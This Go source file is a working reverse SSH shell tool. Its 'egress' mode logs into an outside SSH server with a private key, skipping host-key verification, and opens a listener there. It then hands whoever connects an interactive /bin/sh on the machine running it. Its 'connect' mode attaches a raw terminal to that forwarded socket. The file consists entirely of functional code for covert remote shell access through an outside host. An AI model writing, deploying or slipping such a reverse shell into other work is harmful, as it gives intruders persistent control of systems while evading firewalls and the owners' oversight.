package main

import (
	
	"net"
	"os"
	"io"
	"time"
	"fmt"
	"os/exec"
	"io/ioutil"

	"golang.org/x/crypto/ssh"
	"github.com/kr/pty"
	"golang.org/x/crypto/ssh/terminal"
	
)

func main(){

	var (
		pathkeypem string
		sshuser string
		sshsocket string
		listensocket string

	)

    argsWithoutProg := os.Args[1:]

    mode := argsWithoutProg[0]
    switch mode{

    	case "egress":
           
           if (len(argsWithoutProg) != 5){
    			fmt.Println("Incorrect number of params for \"egress\" mode")
    			return
    		}

        	pathkeypem = argsWithoutProg[1]		// "/path/to/key.pem"
    		sshuser = argsWithoutProg[2]		// "ubuntu,anonymous,root..."
    		sshsocket = argsWithoutProg[3]		// "<IP>:<Port>"
    		listensocket = argsWithoutProg[4]   // "<IP>:<Port>"	
    		
    		RevSshShell(pathkeypem,sshuser,sshsocket,listensocket)

    	case "connect":
           if (len(argsWithoutProg) != 2){
    			fmt.Println("Incorrect number of params for \"connect\" mode")
    			return
    		}

    		listensocket = argsWithoutProg[1] 	// "<IP>:<Port>"
    		
    		ConnectRevSshShell(listensocket)
    	
    	default:
    		fmt.Println("No Mode available")
    } 
}


func RevSshShell(pathkeypem string,sshuser string,sshsocket string,listensocket string) {

    // Retrieve key from file
    content, errFile := ioutil.ReadFile(pathkeypem)
    if errFile != nil {
    	fmt.Println("Load SSH File Key error"+errFile.Error())
    	return
    }

	auth, err := loadPrivateKey(string(content))
	if err != nil {
		fmt.Println("Load Key String error")
		return 
	}

	config := &ssh.ClientConfig{
		User: sshuser,
		Auth: nil,
	    HostKeyCallback: func(hostname string, remote net.Addr, key ssh.PublicKey) error {
            return nil
        },
        Timeout:time.Second * 1,
	}

	config.Auth = append(config.Auth, auth)

	// Dial the SSH connection
	sshConn, err := ssh.Dial("tcp", sshsocket, config)
	if err != nil {
		fmt.Println("Error: error dialing remote host:"+err.Error())
		return 
	}


	// Listen on remote
	l, err := sshConn.Listen("tcp", listensocket)
	if err != nil {
		fmt.Println("Error: error listening on remote host:"+err.Error())
		return 
	}

	listenSSH(sshConn,l)

	return
}


func listenSSH(sshconn *ssh.Client,l net.Listener){

	defer sshconn.Close()

	// Start accepting shell connections
	for {
		conn, err := l.Accept()
		if err != nil {
			continue
		}

		handleConnection(conn)

		return
	}
}

func handleConnection(c net.Conn) {
	defer c.Close()

	// Start the command
	cmd := exec.Command("/bin/sh")

	// Start the command with a pty.
    ptmx, err := pty.Start(cmd)
    if err != nil {
        return
    }
    // Make sure to close the pty at the end.
    defer func() { 
    	_ = ptmx.Close() 
    	cmd.Process.Kill();
    	cmd.Process.Wait();

    }()


    errs := make(chan error, 3)

    go func() {
    	 _, err = io.Copy(ptmx, c) 
		errs <- err
	}()

	go func() {
    	_, err = io.Copy(c, ptmx)
    	errs <- err
	}()

	<-errs
	
    return
}


func ConnectRevSshShell(listensocket string){

    // connect to this socket
    conn, e := net.Dial("tcp", listensocket)
    if e != nil {
		fmt.Println("Error connecting TCP socket: "+e.Error())
		return 
    }

    // MakeRaw put the terminal connected to the given file descriptor into raw
    // mode and returns the previous state of the terminal so that it can be
    // restored.
    oldState, e := terminal.MakeRaw(int(os.Stdin.Fd()))
    if e != nil {
		fmt.Println("Error making raw terminal: "+e.Error())
		return 
    }
    defer func() { _ = terminal.Restore(int(os.Stdin.Fd()), oldState) }()

    go func() { _, _ = io.Copy(os.Stdout, conn) }()
    _, e = io.Copy(conn, os.Stdin)

    return

}



func loadPrivateKey(keyString string) (ssh.AuthMethod, error) {

	signer, signerErr := ssh.ParsePrivateKey([]byte(keyString))
	if signerErr != nil {
		return nil, signerErr
	}
	return ssh.PublicKeys(signer), nil
}